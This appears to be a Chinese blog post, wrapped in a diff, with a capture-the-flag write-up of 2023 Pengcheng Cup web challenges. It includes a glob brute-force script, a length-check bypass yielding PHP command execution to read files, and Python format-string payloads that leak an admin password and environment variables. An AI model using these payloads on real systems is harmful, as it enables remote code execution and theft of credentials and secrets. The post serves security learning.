@@ -1,0 +1,1182 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2023鹏城杯-web 复现前言当时打比赛被爆杀，只写出一个web，一个misc，后来没时间复现，现在来看看 web-1贼简单的pop链 &lt;?php  class Hacker &amp;#123; &amp;#125;  class H &amp;#123;     public $username; &amp;#125;  $b &#x3D; new Hacker();  $a &#x3D; new H(); $a-&gt;usernam">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023鹏城杯-web">
+<meta property="og:url" content="https://zer0peach.github.io/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="2023鹏城杯-web 复现前言当时打比赛被爆杀，只写出一个web，一个misc，后来没时间复现，现在来看看 web-1贼简单的pop链 &lt;?php  class Hacker &amp;#123; &amp;#125;  class H &amp;#123;     public $username; &amp;#125;  $b &#x3D; new Hacker();  $a &#x3D; new H(); $a-&gt;usernam">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115153333098.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173816666.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174832002.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174817690.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173716134.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115175838102.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180158358.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180758401.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115181536992.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115211141073.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115212744307.png">
+<meta property="article:published_time" content="2024-01-15T07:11:32.000Z">
+<meta property="article:modified_time" content="2024-01-15T13:45:20.976Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115153333098.png">
+  
+  
+  
+  <title>2023鹏城杯-web - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023鹏城杯-web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-15 15:11" pubdate>
+          2024年1月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          118 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023鹏城杯-web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2023鹏城杯-web-复现"><a href="#2023鹏城杯-web-复现" class="headerlink" title="2023鹏城杯-web 复现"></a>2023鹏城杯-web 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当时打比赛被爆杀，只写出一个web，一个misc，后来没时间复现，现在来看看</p>
+<h2 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h2><p>贼简单的pop链</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span> </span>&#123;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
+&#125;
+
+<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();
+<span class="hljs-variable">$a</span>-&gt;username = <span class="hljs-variable">$b</span>;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h2><p>filename 会传入 <code>scandir</code> 函数, 当目录存在时返回 yes 否则返回 no</p>
+<p>这里我当时没什么思路，但是源代码中有<code>backdoor_[a-f0-9]&#123;16&#125;.php</code>，但是嫌麻烦，并且还是没啥思路，就算了</p>
+<p>这里可以使用glob协议一位一位来进行判断，因为glob可以使用<code>*</code></p>
+<p>爆破&#x2F;var&#x2F;www&#x2F;html</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests
+
+dicts = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>
+flag = <span class="hljs-string">&#x27;&#x27;</span>
+
+i = <span class="hljs-number">1</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;testing&#x27;</span>, s)
+        url = <span class="hljs-string">&#x27;http://172.10.0.5/&#x27;</span>
+        res = requests.post(url, data=&#123;
+            <span class="hljs-string">&#x27;filename&#x27;</span>: <span class="hljs-string">&#x27;glob:///var/www/html/backdoor_&#x27;</span> + flag + s + <span class="hljs-string">&#x27;*&#x27;</span>,
+        &#125;)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;yesyesyes!!!&#x27;</span> <span class="hljs-keyword">in</span> res.text:
+            flag += s
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found!!!&#x27;</span>, flag)
+            <span class="hljs-keyword">break</span>
+    i += <span class="hljs-number">1</span></code></pre></div>
+
+<p>爆出<code>backdoor_00fbc51dcdf9eef767597fd26119a894.php</code></p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;
+    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;
+    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);
+    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);
+    
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;
+        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];
+        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);
+        &#125;
+        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;
+            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);
+        &#125;
+        <span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);
+        &#125;
+
+    &#125;
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;
+        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>一个队友拿到这个代码后给我，我第一眼以为是限制长度的RCE，但是条件太严行不通，就没有思路了</p>
+<p>结果谁想到绕过十分简单，<strong>使用数组</strong>即可</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    
+<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];
+<span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>));
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>));
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>);</code></pre></div>
+
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115153333098.png" srcset="/img/loading.gif" lazyload alt="image-20240115153333098"></p>
+<p>payload:</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=exp10it&amp;title[]=123&amp;data[]=&lt;?=`nl+/*`;</span> <span class="hljs-meta">HTTP/1.1</span></code></pre></div>
+
+<h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><p>赛后有战队wp中说这是外国一个比赛原题</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sqlite3 <span class="hljs-keyword">import</span> *
+
+<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response
+
+app = Flask(__name__)
+
+salt = <span class="hljs-string">b&#x27;****************&#x27;</span>
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">PassHash</span>(<span class="hljs-title class_ inherited__">str</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()
+
+con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)
+cur = con.cursor()
+cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)
+cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)
+passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.join(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)))
+cur.execute(
+    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,
+    (<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-built_in">str</span>(passhash))
+)
+con.commit()
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():
+    <span class="hljs-keyword">return</span> Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.args <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.args:
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.html&quot;</span>).read()
+    <span class="hljs-keyword">else</span>:
+        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]
+        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])
+        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)
+        cur = con.cursor()
+        res = cur.execute(
+            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,
+            (username, <span class="hljs-built_in">str</span>(new_pwd))
+        )
+        <span class="hljs-keyword">if</span> res.fetchone():
+            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;secret.html&quot;</span>).read()
+        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span>
+                .<span class="hljs-built_in">format</span>(user=username)
+                .<span class="hljs-built_in">format</span>(passhash=new_pwd)
+                )
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10000</span>)</code></pre></div>
+
+<p>这题当时已经看出是python格式化字符串漏洞了，但是可惜不会利用，对flask没有特别了解</p>
+<p>PassHash 虽然继承了 str, 但是只重写了 <code>__str__</code> 和 <code>__repr__</code> 两个方法, 实例化时传入的 password 明文其实还保存在对象里面</p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173816666.png" srcset="/img/loading.gif" lazyload alt="image-20240115173816666"></p>
+<p>大佬说法</p>
+<blockquote>
+<p>比如 <code>passhash.lower()</code> 依然显示的是原来的值</p>
+<p><code>:&gt;0</code> 表示左对齐, 会调用父类 str 的 <code>__format__</code> 方法, 而不是 <code>__str__</code> 和 <code>__repr__</code>, 进而得到明文</p>
+</blockquote>
+<p>看了wp，感觉现在就是要先获取到PassHash这个类的实例</p>
+<p>问了下GPT，大概是这样回答的，后来又问了一次，gpt纠错后的答案感觉不是很靠谱</p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174832002.png" srcset="/img/loading.gif" lazyload alt="image-20240115174832002"></p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174817690.png" srcset="/img/loading.gif" lazyload alt="image-20240115174817690"></p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173716134.png" srcset="/img/loading.gif" lazyload alt="image-20240115173716134"></p>
+<h3 id="获取密码明文"><a href="#获取密码明文" class="headerlink" title="获取密码明文"></a>获取密码明文</h3><p>实际测试</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response
+
+app = Flask(__name__)
+
+salt = <span class="hljs-string">b&#x27;****************&#x27;</span>
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">PassHash</span>(<span class="hljs-title class_ inherited__">str</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()
+
+
+passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.join(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)))
+<span class="hljs-built_in">print</span>(passhash)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    username = request.args[<span class="hljs-string">&quot;username&quot;</span>]
+    new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])
+
+    <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span>
+            .<span class="hljs-built_in">format</span>(user=username)
+            .<span class="hljs-built_in">format</span>(passhash=new_pwd)
+            )
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10000</span>)</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2
+username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2
+username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__repr__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2
+username=&#123;passhash.<span class="hljs-emphasis">__repr__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2</code></pre></div>
+
+<p>以上payload均能够获取<code>__globals__</code>的内容</p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115175838102.png" srcset="/img/loading.gif" lazyload alt="image-20240115175838102"></p>
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>通过<code>__globals__</code>获取到<code>passhash</code>，然后就可以根据大佬的说法</p>
+<div class="code-wrapper"><pre><code class="hljs sqf">:&gt;<span class="hljs-number">0</span> 表示左对齐, 会调用父类 <span class="hljs-built_in">str</span> 的 <span class="hljs-variable">__format__</span> 方法, 而不是 <span class="hljs-variable">__str__</span> 和 <span class="hljs-variable">__repr__</span>, 进而得到明文</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[passhash]:&gt;0&#125;&amp;password=2</code></pre></div>
+
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180158358.png" srcset="/img/loading.gif" lazyload alt="image-20240115180158358"></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>也可以取数组下标一位一位弄出来</p>
+<div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[passhash][0]&#125;&amp;password=2</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs asciidoc">import requests
+url = &quot;<span class="hljs-link">http://localhost:5000/?username=&#123;passhash.__class__.__str__.__globals__</span>[<span class="hljs-string">passhash</span>]&quot;
+for i in range(20):
+<span class="hljs-code">    req = requests.get(url+f&quot;[&#123;i&#125;]&quot;+&quot;&#125;&amp;password=2&quot;)</span>
+<span class="hljs-code">    print(req.text)</span></code></pre></div>
+
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180758401.png" srcset="/img/loading.gif" lazyload alt="image-20240115180758401"></p>
+<p>这样就获取到了admin的密码</p>
+<h3 id="获取环境变量"><a href="#获取环境变量" class="headerlink" title="获取环境变量"></a>获取环境变量</h3><p>登录</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql">/?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">3673940420288307</span></code></pre></div>
+
+<p>提示 flag 在环境变量里面</p>
+<p>于是通过 flask app 找到 os 模块, 然后读取 environ 属性</p>
+<div class="code-wrapper"><pre><code class="hljs fallback">username=&#123;passhash.__str__.__globals__[app].__init__.__globals__[os].environ&#125;&amp;password=2</code></pre></div>
+
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115181536992.png" srcset="/img/loading.gif" lazyload alt="image-20240115181536992"></p>
+<p>这个payload也可以</p>
